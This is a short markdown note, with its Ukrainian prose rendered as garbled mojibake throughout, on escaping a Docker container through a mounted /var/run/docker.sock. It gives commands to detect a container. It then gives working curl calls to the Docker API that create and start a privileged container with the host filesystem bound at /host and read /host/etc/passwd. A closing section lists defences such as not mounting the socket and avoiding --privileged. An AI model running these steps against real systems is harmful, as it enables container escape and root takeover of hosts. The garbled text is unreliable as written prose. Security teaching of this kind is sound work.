# Docker Socket Escape ‚Äî Practical Notes

## üîé –Ø–∫ –∑—Ä–æ–∑—É–º—ñ—Ç–∏, —â–æ –º–∏ –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ Docker
–Ñ –∫—ñ–ª—å–∫–∞ –ø—Ä–æ—Å—Ç–∏—Ö –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫:

```bash
# 1. –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ cgroups
cat /proc/1/cgroup

# –Ø–∫—â–æ —É –≤–∏–≤–æ–¥—ñ —î "docker", "kubepods", "containerd" ‚Äî –º–∏ —É –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ.

# 2. –°–ø–µ—Ü—Ñ–∞–π–ª Docker
ls -la /.dockerenv

# –Ø–∫—â–æ —ñ—Å–Ω—É—î ‚Äî —Ü–µ Docker-–∫–æ–Ω—Ç–µ–π–Ω–µ—Ä.

# 3. Hostname
hostname
# –ß–∞—Å—Ç–æ —Ü–µ –≤–∏–ø–∞–¥–∫–æ–≤–∏–π hash-–ø–æ–¥—ñ–±–Ω–∏–π ID (—è–∫ —É docker ps).
```

---

## ‚ö†Ô∏è Docker Socket Escape

### –©–æ —Ç–∞–∫–µ `/var/run/docker.sock`?
–¶–µ UNIX-—Å–æ–∫–µ—Ç, —á–µ—Ä–µ–∑ —è–∫–∏–π Docker-–∫–ª—ñ—î–Ω—Ç —Å–ø—ñ–ª–∫—É—î—Ç—å—Å—è –∑ Docker-–¥–µ–º–æ–Ω–æ–º (`dockerd`) –Ω–∞ —Ö–æ—Å—Ç—ñ.  
- –Ø–∫—â–æ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –º–∞—î –¥–æ—Å—Ç—É–ø –¥–ª—è **—á–∏—Ç–∞–Ω–Ω—è/–∑–∞–ø–∏—Å—É** –¥–æ —Ü—å–æ–≥–æ —Å–æ–∫–µ—Ç–∞, —Ç–æ –ø—Ä–æ—Ü–µ—Å —É—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ –º–æ–∂–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –±—É–¥—å-—è–∫—ñ –¥—ñ—ó –∑ Docker –≤—ñ–¥ —ñ–º–µ–Ω—ñ root –Ω–∞ —Ö–æ—Å—Ç—ñ.  
- –¶–µ –æ–∑–Ω–∞—á–∞—î **–ø–æ–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ —Ö–æ—Å—Ç–æ–º**.

---

## üõ†Ô∏è –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è —á–µ—Ä–µ–∑ Docker API

1. **–ü–µ—Ä–µ–≥–ª—è–¥ –Ω–∞—è–≤–Ω–∏—Ö –æ–±—Ä–∞–∑—ñ–≤**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **–°—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ –∑ –¥–æ—Å—Ç—É–ø–æ–º –¥–æ —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ —Ö–æ—Å—Ç–∞**
```bash
curl -X POST --unix-socket /var/run/docker.sock   -H "Content-Type: application/json"   -d '{
    "Image": "php:8.1-cli",
    "Cmd": ["/bin/sh"],
    "Tty": true,
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/host"]
    }
  }'   http://localhost/containers/create
```

3. **–ó–∞–ø—É—Å–∫ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞**
```bash
curl -X POST --unix-socket /var/run/docker.sock   http://localhost/containers/<ID>/start
```

4. **–û—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É –¥–æ —Ö–æ—Å—Ç–æ–≤–æ—ó —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏**
```bash
docker exec -it <ID> sh
ls -la /host
cat /host/etc/passwd
```

---

## üîê –†–∏–∑–∏–∫–∏
- –ü–æ–≤–Ω–∏–π **escape –∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ –Ω–∞ —Ö–æ—Å—Ç**.  
- –ú–æ–∂–ª–∏–≤—ñ—Å—Ç—å —á–∏—Ç–∞—Ç–∏/–ø–∏—Å–∞—Ç–∏ —Ñ–∞–π–ª–∏ —Ö–æ—Å—Ç–∞.  
- –ï—Å–∫–∞–ª–∞—Ü—ñ—è –¥–æ root –Ω–∞ —Ö–æ—Å—Ç—ñ.  

---

## ‚úÖ –Ø–∫ –∑–∞—Ö–∏—Å—Ç–∏—Ç–∏—Å—è
- –ù—ñ–∫–æ–ª–∏ –Ω–µ –º–æ–Ω—Ç—É–≤–∞—Ç–∏ `/var/run/docker.sock` —É –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏.  
- –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `docker-socket-proxy`, —è–∫—â–æ –ø–æ—Ç—Ä—ñ–±–µ–Ω –¥–æ—Å—Ç—É–ø –¥–æ API.  
- –ú—ñ–Ω—ñ–º—ñ–∑—É–≤–∞—Ç–∏ capabilities –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤ (–Ω–µ –∑–∞–ø—É—Å–∫–∞—Ç–∏ –∑ `--privileged`).  
- –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ AppArmor/SELinux –ø—Ä–æ—Ñ—ñ–ª—ñ.  

---

## üìå –í–∏—Å–Ω–æ–≤–æ–∫
–î–æ—Å—Ç—É–ø–Ω–∏–π –¥–ª—è –∑–∞–ø–∏—Å—É `/var/run/docker.sock` = **–ø–æ–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ —Ö–æ—Å—Ç–æ–º**.  
–¶–µ –æ–¥–Ω–∞ –∑ –Ω–∞–π–∫—Ä–∏—Ç–∏—á–Ω—ñ—à–∏—Ö –ø–æ–º–∏–ª–æ–∫ —É –±–µ–∑–ø–µ—Ü—ñ Docker.
